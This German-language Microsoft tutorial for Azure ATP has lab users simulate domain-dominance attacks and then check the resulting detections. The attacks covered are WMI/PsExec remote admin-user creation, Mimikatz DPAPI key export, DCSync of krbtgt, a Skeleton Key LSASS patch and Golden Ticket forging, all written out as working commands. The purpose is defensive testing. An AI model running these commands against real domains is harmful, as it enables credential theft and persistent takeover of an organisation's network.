---
title: Playbook zur Azure ATP-Domänendominanz
description: Das Azure ATP-Domänendominanzplaybook beschreibt, wie Sie Domänendominanzangriffe für die Erkennung durch Azure ATP simulieren
ms.service: azure-advanced-threat-protection
ms.topic: tutorial
author: shsagir
ms.author: shsagir
ms.date: 02/28/2019
ms.reviewer: itargoet
ms.openlocfilehash: b5903123e992f7540dd660da605a1568bf76ef91
ms.sourcegitcommit: 11fff9d4ebf1c50b04f7789a22c80cdbc3e4416a
ms.translationtype: HT
ms.contentlocale: de-DE
ms.lasthandoff: 03/15/2020
ms.locfileid: "79414589"
---
# <a name="tutorial-domain-dominance-playbook"></a>Tutorial: Playbook zu Domänendominanz

Das letzte Tutorial in dieser vierteiligen Reihe zu Azure ATP-Sicherheitswarnungen ist ein Domänendominanzplaybook. Die Azure ATP-Sicherheitswarnungsumgebung soll die Funktionen von **Azure ATP** zum Identifizieren und Erkennen potenzieller Angriffe auf Ihr Netzwerk veranschaulichen. Die Testumgebung erläutert das Testen der *diskreten* Erkennungen von Azure ATP mit den *signaturbasierten* Funktionen von Azure ATP. Die Tutorials umfassen nicht Verhaltenserkennungen und Warnungen auf Basis des erweiterten Machine Learning von Azure ATP, auf Benutzer- oder Entitätsbasis. Diese Typen von Erkennungen und Warnungen sind in den Tests nicht enthalten, da sie eine Lernphase und echten Netzwerkdatenverkehr für bis zu 30 Tage erfordern. Weitere Informationen über jedes Tutorial dieser Reihe finden Sie unter [Tutorialübersicht: ATP-Sicherheitswarnungsumgebung](atp-playbook-lab-overview.md).

Dieses Playbook stellt einige der Dienste für Domänendominanz-Bedrohungserkennungen und Sicherheitswarnungen von Azure ATP mithilfe simulierter Angriffe durch allgemeine, reale, öffentlich verfügbare Hacker- und Angriffstools vor. Die behandelten Methoden werden normalerweise an diesem Punkt in der Abwehrkette gegen Cyberangriffe verwendet, um permanente Domänendominanz zu erzielen.

In diesem Tutorial simulieren Sie Versuche, eine permanente Domänendominanz zu erreichen, um jede der Azure ATP-Erkennungen für die folgenden allgemeinen Methoden zu überprüfen:

> [!div class="checklist"]
> * Codeausführung von Remotestandorten
> * Datenschutz-API (Data Protection API, DPAPI)
> * Böswillige Replikation
> * Erstellen eines Diensts
> * Skeleton Key
> * Golden Ticket


## <a name="prerequisites"></a>Voraussetzungen

1. [Eine vollständige ATP-Sicherheitswarnungsumgebung](atp-playbook-setup-lab.md) 
     - Sie sollten die Setupanweisungen für die Testumgebung genau einhalten. Je mehr Ihre Testumgebung dem vorgeschlagenen Testumgebungssetup entspricht, desto einfacher können Sie die Azure ATP-Testverfahren befolgen.

2. [Fertigstellung des Lateral-Movement-Playbooks](atp-playbook-lateral-movement.md)

## <a name="domain-dominance"></a>Domänendominanz

Während der Phase der Domänendominanz in der Abwehrkette gegen Cyberangriffe hat ein Angreifer bereits legitime Anmeldedaten für den Zugriff auf Ihren Domänencontroller erlangt. Der Zugriff des Angreifers auf Ihren Domänencontroller bedeutet, dass Ihrem Netzwerk Schäden jeglichen Ausmaßes zugefügt werden können. Vom unmittelbaren Schaden abgesehen, platzieren speziell die raffinierteren Angreifer gern zusätzliche *Versicherungsrichtlinien* in Umgebungen, die sie kompromittiert haben. Diese Angriffe gewährleisten, dass ein Angreifer auch nach der Erkennung seiner anfänglichen Gefährdungen und Aktionen noch über dauerhaften Zugang zu Ihrer Domäne verfügt, was die Wahrscheinlichkeit seines langfristigen Erfolgs erhöht.

### <a name="remote-code-execution"></a>Codeausführung von Remotestandorten

Codeausführung von Remotestandorten ist genau das, wonach es sich anhört. Angreifer schaffen sich eine Möglichkeit, remote Code für eine Ressource auszuführen, in diesem Fall für einen Domänencontroller. Wir werden versuchen, diese vertrauten Tools zusammen zu verwenden, um Code von Remotestandorten auszuführen und dauerhaften Zugriff auf den Domänencontroller zu erlangen, um dann zu sehen, was Azure ATP uns zeigt.

- Windows-Verwaltungsinstrumentation (WMI)
- PsExec von SysInternals

Versuchen Sie, mithilfe von WMI über die Befehlszeile einen Prozess lokal auf dem Domänencontroller zu erstellen, um einen Benutzer mit dem Namen „InsertedUser“ mit dem Kennwort pa$ $w0rd1 zu erstellen.

1. Öffnen Sie die im Kontext von *SamiraA* ausgeführte Befehlszeile auf dem **VictimPC**, und führen Sie den folgenden Befehl aus:

   ``` cmd
   wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
   ```

2. Fügen Sie jetzt den erstellten Benutzer der Gruppe „Administrators“ auf dem Domänencontroller hinzu:

   ``` cmd
   PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
   ```

   ![Verwenden der Codeausführung von Remotestandorten (PsExec), um der Administratorgruppe auf dem Domänencontroller den neuen Benutzer hinzuzufügen](media/playbook-dominance-psexec_addtoadmins.png)

3. Wechseln Sie zu **Active Directory-Benutzer und -Computer (ADUC)** auf **ContosoDC**, und suchen Sie den **InsertedUser**. 

4. Klicken Sie mit der rechten Maustaste auf **Eigenschaften**, und überprüfen Sie die Mitgliedschaft.

   ![Anzeigen der Eigenschaften von „InsertedUser“](media/playbook-dominance-inserteduser_properties.png)

Als Angreifer haben Sie in Ihrer Testumgebung erfolgreich mithilfe von WMI einen neuen Benutzer erstellt. Sie haben auch mithilfe von PsExec den neuen Benutzer der Gruppe „Administrators“ hinzugefügt. Aus der Perspektive der Persistenz wurde eine weitere berechtigte, unabhängige Anmeldeinformation auf dem Domänencontroller erstellt. Neue Anmeldeinformationen bieten einem Angreifer permanenten Zugriff auf den Domänencontroller für den Fall, dass die vorherigen Anmeldeinformationen erkannt und entfernt wurden.

### <a name="remote-code-execution-detection-in-azure-atp"></a>Erkennung der Codeausführung von Remotestandorten in Azure ATP

Melden Sie sich beim Azure ATP-Portal an, um zu überprüfen, was Azure ATP ggf. von unserem letzten simulierten Angriff erkannt hat:

![Erkennen von WMI-Codeausführung von Remotestandorten durch Azure ATP](media/playbook-dominance-wmipsexecdetected.png)

Azure ATP erkannte die Ausführung von WMI- und PsExec-Code von Remotestandorten.

Aufgrund der Verschlüsselung für die WMI-Sitzung sind bestimmte Werte wie z.B. die eigentlichen WMI-Methoden oder das Ergebnis des Angriffs nicht sichtbar. Allerdings liefert die Erkennung dieser Aktionen durch Azure ATP uns ideale Informationen, um Defensivmaßnahmen zu ergreifen.  

VictimPC, der Computer, sollte nie remote Code für die Domänencontroller ausführen.

Da Azure ATP erfährt, wer im Laufe der Zeit in welche Sicherheitsgruppen eingefügt wird, werden ähnliche verdächtige Aktivitäten in der Zeitachse als anomale Aktivitäten identifiziert. Da diese Testumgebung vor kurzem erstellt wurde und weiterhin in der Lernphase ist, wird diese Aktivität nicht als Warnung angezeigt. Das Erkennen der Änderung von Sicherheitsgruppen durch Azure ATP kann durch Überprüfen der Aktivitätszeitachse festgestellt werden. Mit Azure ATP können Sie auch Berichte zu allen Änderungen von Sicherheitsgruppen generieren, die Sie proaktiv per E-Mail erhalten können.

Greifen Sie mit dem Suchtool auf die Seite**Administrator** im Azure ATP-Portal zu. Die Azure ATP-Erkennung des Einfügens des Benutzers wird auf der Aktivitätszeitachse der Administratorengruppe angezeigt.

![Anzeigen des zur sensiblen Sicherheitsgruppe hinzugefügten Benutzers](media/playbook-dominance-admininserteduser.png)

### <a name="data-protection-api-dpapi"></a>Datenschutz-API (Data Protection API, DPAPI)

Die Datenschutz-API (Data Protection Application Programming Interface, DPAPI) wird von Windows verwendet, um von Browsern gespeicherte Kennwörter, verschlüsselte Dateien und andere sensible Daten sicher zu schützen. Domänencontroller enthalten einen Hauptschlüssel, der *alle* Geheimnisse auf mit einer Domäne verbundenen Windows-Computern entschlüsseln kann.

Mithilfe von **Mimikatz** versuchen wir, den Hauptschlüssel vom Domänencontroller zu exportieren. 

1. Führen Sie den folgenden Befehl für den Domänencontroller aus:

   ``` cmd
   mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
   ```

   ![Verwendung von Mimikatz zum Exportieren des DPAPI-Sicherungsschlüssels aus Active Directory](media/playbook-dominance-dpapi_mimikatz.png)

2. Überprüfen Sie, ob die Hauptschlüsseldatei exportiert wurde. Informieren Sie sich über die erstellten DER-, PFX-, PVK- und KEY-Dateien in dem Verzeichnis, in dem Sie „mimikatz.exe“ ausgeführt haben. Kopieren Sie den veralteten Schlüssel aus der Befehlszeile.

Als Angreifer verfügen wir jetzt über den Schlüssel zum Entschlüsseln aller DPAPI-verschlüsselten Dateien / sensiblen Daten aus *allen* Computern in der Gesamtstruktur.

### <a name="dpapi-detection-in-azure-atp"></a>DPAPI-Erkennung in Azure ATP

Mit dem Azure ATP-Portal überprüfen wir, ob Azure ATP unseren DPAPI-Angriff erfolgreich erkannt hat:

![Azure ATP erkannte die DPAPI-Anforderung.](media/playbook-dominance-dpapidetected.png)

### <a name="malicious-replication"></a>Böswillige Replikation

Böswillige Replikation ermöglicht einem Angreifer, Benutzerinformationen mithilfe der Domänenadministrator-Anmeldeinformationen (oder Äquivalentem) zu replizieren. Mit böswilliger Replikation kann ein Angreifer im Wesentlichen eine Anmeldeinformation zu stehlen. Natürlich ist das am meisten durch Angriffe zum Stehlen der Anmeldeinformationen gefährdete Konto „krbtgt“, da es der Hauptschlüssel zum Signieren aller Kerberos-Tickets ist.

Die zwei gängigsten Hackertoolsets, die Angreifern böswillige Replikationsversuche ermöglichen, sind **Mimikatz** und **Impacket** von Core Security.

#### <a name="mimikatz-lsadumpdcsync"></a>Mimikatz lsadump::dcsync

Führen Sie auf **VictimPC** im Kontext von **SamirA** den folgenden Mimikatz-Befehl aus:

``` cmd
mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\temp\ContosoDC_krbtgt-export.txt
```

Wir haben die Kontoinformationen von „krbtgt“ repliziert: „c:\\temp\\ContosoDC_krbtgt-export.txt“.

![Böswillige Replikation mittels Mimikatz](media/playbook-dominance-maliciousrep_mimikatz.png)

#### <a name="malicious-replication-detection-in-azure-atp"></a>Erkennung der böswilligen Replikation in Azure ATP

Überprüfen Sie mit dem Azure ATP-Portal, ob die böswillige Replikation, die wir von VictimPC aus simuliert haben, jetzt SOC bekannt ist.

![Von AATP erkannte böswillige Replikation](media/playbook-dominance-maliciousrep_detected.png)

### <a name="skeleton-key"></a>Skeleton Key

Eine andere Domänendominanzmethode, die Angreifer verwenden, heißt **Skeleton Key**. Mit einem Skeleton Key, den der Angreifer erstellt hat, kann er sich *als beliebiger Benutzer* maskieren, und zwar *jederzeit*. Während eines Skeleton Key-Angriffs kann sich jeder Benutzer weiterhin mit seinem normalen Kennwort anmelden, aber jedes Konto erhält auch ein Masterkennwort. Neues Masterkennwort bzw. Skeleton Key ermöglichen jedem, der sie kennt, vollen Zugriff auf das Konto. Ein Skeleton Key-Angriff wird durch das Patchen des Prozesses „LSASS.exe“ auf dem Domänencontroller durchgeführt, wodurch die Benutzerauthentifizierung über eine herabgestufte Verschlüsselung erzwungen wird.

Wir verwenden einen Skeleton Key, um zu sehen, wie diese Art von Angriff funktioniert:

1. Verschieben Sie **mimikatz** mithilfe der **SamirA**-Anmeldeinformationen, die wir zuvor abgerufen haben, nach **ContosoDC**. Stellen Sie sicher, dass Sie die richtige Architektur von **mimikatz.exe** basierend auf dem Architekturtyp des DC (64-Bit bzw. 32-Bit) pushen. Führen Sie im **mimikatz**-Ordner Folgendes aus:

   ``` cmd
   xcopy mimikatz.exe \\ContosoDC\c$\temp
   ```

2. Da **mimikatz** nun auf dem DC bereitgestellt ist, führen Sie das Programm über PsExec remote aus:

   ``` cmd
   PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
   ```

3. Sie haben den LSASS-Prozess erfolgreich auf **ContosoDC** gepatcht.

   ![Skeleton Key-Angriff über mimikatz](media/playbook-dominance-skeletonkey.png)

### <a name="exploiting-the-skeleton-key-patched-lsass"></a>Ausnutzen des mit Skeleton Key gepatchten LSASS

Öffnen Sie auf **VictimPC** eine Cmd-Eingabeaufforderung (im Kontext von **JeffL**), und führen Sie Folgendes aus, um zu versuchen, den Kontext von RonHD zu erhalten.

``` cmd
runas /user:ronhd@contoso.azure "notepad"
```

Wenn Sie aufgefordert werden, verwenden Sie absichtlich das falsche Kennwort. Diese Aktion weist nach, dass das Konto nach dem Ausführen des Angriffs *weiterhin* ein Kennwort hat.  

![Verwendung eines *falschen* Kennworts nach dem Skeleton Key-Angriff (diese Methode funktioniert genau wie beschrieben)](media/playbook-dominance-skeletonkey_wrong.png)

Aber Skeleton Key fügt jedem Konto ein zusätzliches Kennwort hinzu. Führen Sie den Befehl „runas“ erneut aus, aber verwenden Sie dieses Mal „mimikatz“ als Kennwort.

``` cmd
runas /user:ronhd@contoso.azure "notepad"
```

Dieser Befehl erstellt einen neuen Prozess, *notepad*, der im Kontext von RonHD ausgeführt wird. **Skeleton Key kann für _alle_ Konten ausgeführt werden, inklusive Dienst- und Computerkonten.**

> [!Important]
> Es ist wichtig, dass Sie ContosoDC nach Ausführen des Skeleton Key-Angriffs neu starten. Wenn nicht, wird der Prozess „LSASS.exe“ auf ContosoDC gepatcht und geändert, sodass jede Authentifizierungsanforderung auf RC4 herabgestuft wird.

### <a name="skeleton-key-attack-detection-in-azure-atp"></a>Erkennung des Skeleton Key-Angriffs in Azure ATP

Was hat Azure ATP erkannt und berichtet, während all dies geschah?

![Skeleton Key-Angriff von AATP erkannt](media/playbook-dominance-skeletonkey_detected.png)

Azure ATP hat erfolgreich die verdächtige Vorauthentifizierungs-Verschlüsselungsmethode erkannt, die für diesen Benutzer verwendet wurde.

### <a name="golden-ticket---existing-user"></a>Golden Ticket – vorhandener Benutzer

Nach dem Diebstahl des „Golden Ticket“ („krbtgt“-Konto, erläutert [hier über böswillige Replikation](#malicious-replication)) kann ein Angreifer Tickets signieren, *als sei er der Domänencontroller*. **Mimikatz**, die Domänen-SID und das gestohlene „krbtgt“-Konto sind alle erforderlich, um diesen Angriff auszuführen. Wir können nicht nur Tickets für einen Benutzer generieren, sondern auch für Benutzer, die noch nicht vorhanden sind.

1. Führen Sie als JeffL den folgenden Befehl auf **VictimPC** aus, um die Domänen-SID abzurufen:

   ``` cmd
   whoami /user
   ```

   ![SID für Golden Ticket-Benutzer](media/playbook-dominance-golden_whoamisid.png)

2. Identifizieren und kopieren Sie die im obigen Screenshot hervorgehobene Domänen-SID.

3. Verwenden Sie mithilfe von **mimikatz** die kopierte Domänen-SID zusammen mit dem gestohlenen NTLM-Hash des „krbtgt“-Benutzers zum Generieren des TGT. Fügen Sie den folgenden Text als JeffL in eine „cmd.exe“-Datei ein:

   ``` cmd
   mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
   ```

   ![Generieren des Golden Ticket](media/playbook-dominance-golden_generate.png)

   Der ```/ptt```-Teil des Befehls ermöglichte uns, das generierte Ticket sofort dem Arbeitsspeicher zu übergeben.

4. Stellen Sie sicher, dass die Anmeldeinformationen sich im Arbeitsspeicher befinden.  Führen Sie ```klist``` in der Konsole aus.

   ![Klist-Ergebnisse nach dem Übergeben des generierten Tickets](media/playbook-dominance-golden_klist.png)

5. Führen Sie als Angreifer den folgenden Pass-the-Ticket-Befehl gegen den DC aus:

   ``` cmd
   dir \\ContosoDC\c$
   ```

   Erfolgreich! Sie haben ein **gefälschtes** Golden Ticket für SamiraA generiert.

   ![Ausführen des Golden Ticket über Mimikatz](media/playbook-dominance-golden_ptt.png)

Warum hat es funktioniert? Der Golden Ticket-Angriff funktioniert, da das generierte Ticket ordnungsgemäß mit dem Schlüssel „KRBTGT“ signiert wurde, den wir zuvor gestohlen haben. Dieses Ticket ermöglicht uns, als Angreifer Zugriff auf ContosoDC zu erlangen und uns einer Sicherheitsgruppe hinzuzufügen, die wir verwenden möchten.

#### <a name="golden-ticket--existing-user-attack-detection"></a>Golden Ticket – Erkennung des Angriffs auf einen vorhandenen Benutzer

Azure ATP verwendet mehrere Methoden, um vermutete Angriffe dieses Typs zu erkennen. In genau diesem Szenario hat Azure ATP die Herabstufung der Verschlüsselung des gefälschten Tickets erkannt.

![Golden Ticket wird erkannt](media/playbook-dominance-golden_detected.png)

> [!Important]
>Erinnerung. Solange das von einem Angreifer gestohlene KRBTGT in einer Umgebung gültig ist, bleiben die damit generierten Tickets auch gültig. In diesem Fall erreicht der Angreifer permanente Domänendominanz, bis [KRBTGT zweimal zurückgesetzt wird](https://docs.microsoft.com/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).

## <a name="next-steps"></a>Nächste Schritte

* [Leitfaden zu Azure ATP-Sicherheitswarnungen](suspicious-activity-guide.md)
* [Investigate lateral movement paths with Azure ATP (Untersuchen von Lateral Movement-Pfaden mit Azure ATP)](use-case-lateral-movement-path.md)
* [Besuchen Sie das Azure ATP-Forum](https://aka.ms/azureatpcommunity)

## <a name="join-the-community"></a>Beitritt zur Community

Haben Sie weitere Fragen, oder möchten Sie mit anderen über Azure ATP und damit verbundene Sicherheitsaspekte diskutieren? Treten Sie noch heute der [Azure ATP-Community](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) bei!